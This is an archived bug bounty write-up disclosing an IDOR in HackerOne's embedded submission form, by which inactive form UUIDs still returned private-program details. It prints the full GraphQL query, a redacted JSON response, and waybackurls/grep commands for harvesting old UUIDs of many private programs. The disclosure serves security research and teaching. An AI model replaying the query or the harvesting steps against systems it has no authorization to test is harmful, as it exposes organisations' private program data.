# IDOR on HackerOne Embedded Submission Form

- **Source URL:** https://medium.com/pinoywhitehat/idor-on-hackerone-embedded-submission-form-9e59c6f044b3?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20241007225056/https://medium.com/pinoywhitehat/idor-on-hackerone-embedded-submission-form-9e59c6f044b3
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/6457 (id 6457)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# IDOR on HackerOne Embedded Submission Form

**Severity:** Low (3.7) — Medium (4.4)

**Weakness:** Improper Access Control

**Bounty:** $2,500


Hey hackers! Hope you are all doing well :)

I just wanna share again my recent finding which is in limited disclosure so I am creating a write to give more details and context. Please note that I will be redacting sensitive information that belongs to a private program.

I found an Insecure Direct Object Reference (IDOR) vulnerability that allows me to access sensitive information from private program such as *intro text, response efficiency percentage, and structured scopes* using the [embedded submission form](https://docs.hackerone.com/en/articles/8541571-embedded-submission-form) of HackerOne.

The following GraphQL below is used to fetch information

```
POST /graphql?embedded_submission_form_uuid=<UUID> HTTP/2
Host: hackerone.com
Cookie: <REDACTED>
<SNIP>
<SNIP
{
  "operationName": "EmbeddedSubmissionPage",
  "variables": {
    "uuid": "<UUID>",
    "product_area": "emdedded_submission_form",
    "product_feature": "submission_page"
  },
  "query": "query EmbeddedSubmissionPage($uuid: String!) {\n  me {\n    id\n    signal\n    reputation\n    __typename\n  }\n  embedded_submission_form(uuid: $uuid) {\n    id\n    promotionEnabled: promotion_enabled\n    typeface\n    accent_color\n    accent_text_color\n    link_color\n    button_color\n    button_text_color\n    team {\n      id\n      handle\n      name\n      abuse\n      offers_bounties\n      report_submission_form_intro\n      customized_report_template\n      cwe_field_hidden\n      structured_scopes(archived: false) {\n        total_count\n        __typename\n      }\n      response_efficiency_percentage\n      team_display_options {\n        id\n        show_response_efficiency_indicator\n        __typename\n      }\n      submissionRequirements: submission_requirements {\n        id\n        severityCalculationMethods: severity_calculation_methods\n        severityRequiredAt: severity_required_at\n        __typename\n      }\n      custom_field_attributes(\n        where: {internal: {_eq: false}, archived_at: {_is_null: true}}\n      ) {\n        edges {\n          node {\n            ... on CustomFieldAttributeInterface {\n              id\n              internal\n              required\n              helper_text\n              key\n              label\n              required\n              helper_text\n              databaseId: _id\n              type: __typename\n            }\n            ... on CustomFieldAttributesList {\n              id\n              items\n              __typename\n            }\n            ... on CustomFieldAttributesCheckbox {\n              id\n              checkbox_text\n              __typename\n            }\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"
}
```
The GraphQL above will show the information about the program’s embedded submission form (*if the UUID is still alive and accessible, means not inactive*)

It was closed as duplicate of N/A with the following reason excerpt from the first report:

So they said…

“Once a teams posts the embedded submission for on the internet it’s considered public and we on purpose allow anyone finding that link to participate in the program (authenticated or not). If the link to the embedded submission form is not shared publicly, then it should be secret.”


which is reasonable, because the purpose of embedded submission form is to allow hackers to submit reports without having to create an account on HackerOne.

I have few circle of followers in twitter who submitted the same scenario above which is consider as N/A due to the following reason mentioned above as well. They are claiming that they submitted the same vulnerability as mine without having a full context why my report is considered as valid (one reason why i decided to create this write up)

Now, the question is why my report becomes valid ? , let’s go the exploitation part :)

**Exploitation**

I continue to check if how can I turn that to an exploitable scenario, and then I found a UUID which is already **inactive/deleted,** this means that even it is somehow published on the internet before, the company decided to delete/disabled it or make it inactive, therefor anyone should not be able to fetch information using that UUID. If you check the user interface, you will see something like this:

So when try to query the information using the same GraphQL above, the response shows all the information about the program where the inactive UUID belongs to.

```
HTTP/2 200 OK
Date: Tue, 30 Apr 2024 06:47:13 GMT
Content-Type: application/json; charset=utf-8
User-Authenticated: true
Set-Cookie:<REDACTED>
<SNIP>
[
  {
    "data": {
      "me": {
        "id": "<REDACTED>",
        "signal": <REDACTED>,
        "reputation": <REDACTED>,
        "__typename": "User"
      },
      "embedded_submission_form": {
        "id": "<REDACTED>",
        "promotionEnabled": true,
        "typeface": null,
        "accent_color": null,
        "accent_text_color": null,
        "link_color": null,
        "button_color": null,
        "button_text_color": null,
        "team": {
          "id": "<REDACTED>",
          "handle": "<REDACTED>",
          "name": "<REDACTED>",
          "abuse": null,
          "offers_bounties": true,
          "report_submission_form_intro": "You're about to submit a report to <REDACTED>. Provide as much information as possible about the potential issue you have discovered. The more information you provide, the quicker we will be able to validate the issue. If you haven't yet, please remember to review our Policy & Scope\n",
          "customized_report_template": true,
          "cwe_field_hidden": false,
          "structured_scopes": {
            "total_count": <REDACTED>,
            "__typename": "StructuredScopesConnection"
          },
          "response_efficiency_percentage": <REDACTED>,
          "team_display_options": {
            "id": "<REDACTED>",
            "show_response_efficiency_indicator": true,
            "__typename": "TeamDisplayOptions"
          },
          "submissionRequirements": null,
          "custom_field_attributes": {
            "edges": [],
            "__typename": "CustomFieldAttributeConnection"
          },
          "__typename": "Team"
        },
        "__typename": "EmbeddedSubmissionForm"
      }
    }
  }
]
```
**Time to argue!!!** :)

I commented that I was able to obtain sensitive information from the embedded form uuid which is not accessible and already disabled/inactive/deleted. Together with the supporting reference from a disclosed report on the hacktivity [#2483666](https://hackerone.com/reports/2483666)

Now one of the amazing analyst pablo do his job well done by responding and investigating the potential security impact. Report was reopened for internal teams discussion

**But a challenges always comes** :) A team ask this info…

**Challenge accepted!**

Using one of my recon methodologies, I commented all the steps to obtain multiple UUID that is already inactive/disabled.

**Steps to reproduce (obtaining inactive UUID of many private programs)**

1. Use this command `echo 'https://hackerone.com/' | waybackurls > lists.txt` make sure you have waybackurls installed on your attackbox
2. `cat lists.txt | grep "embedded_submissions" > results.txt`
3. `cat results.txt`
4. You will find a lot of embedded submission id of many random private programs, you can check it by browsing each URL

Supporting documents from HackerOne itself:

As stated in the New Platform Detailed Standards: [https://docs.hackerone.com/en/articles/8369826-detailed-platform-standards](https://docs.hackerone.com/en/articles/8369826-detailed-platform-standards), there could be many ways of obtaining an unpredictable `UUID`


And one of these ways is the recon methodology that I've shown above.

**Finally!**

# Disclosure Timeline

- April 30, 2024, 7:06am UTC — Report submitted
- May 5, 2024, 11:54am UTC — Closed as duplicate of N/A
- May 5, 2024, 12:05pm UTC — Started multiple comments showing exploitation
- May 11, 2024, 8:52am UTC — Report reopened
- May 18, 2024, 10:17am UTC — Team ask for more information on how to obtain UUIDs
- May 18, 2024, 10:46am UTC — Shows a PoC obratining mutliple UUIDs
- May 27, 2024, 10:46am UTC — Triage and $2,500 bounty rewarded

**Takeaways:**

- Always find a way to exploit and show an impact
- Always read hacktivity for supporting references :) , sometimes you’ll also find a bypass of other reports.
- Don’t be afraid to argue if you think you are really right, prove them wrong :) sometimes security team overlook an important piece of information from the report, all you have to do is politely explain to them your point and show them how it can be exploited and what is the security impact.

**Shout’out to all Pinoy Bug Bounty Hunters out there! :)**

Cheers!

Japz*https://twitter.com/japzdivinohttps://www.facebook.com/pinoywhitehat*
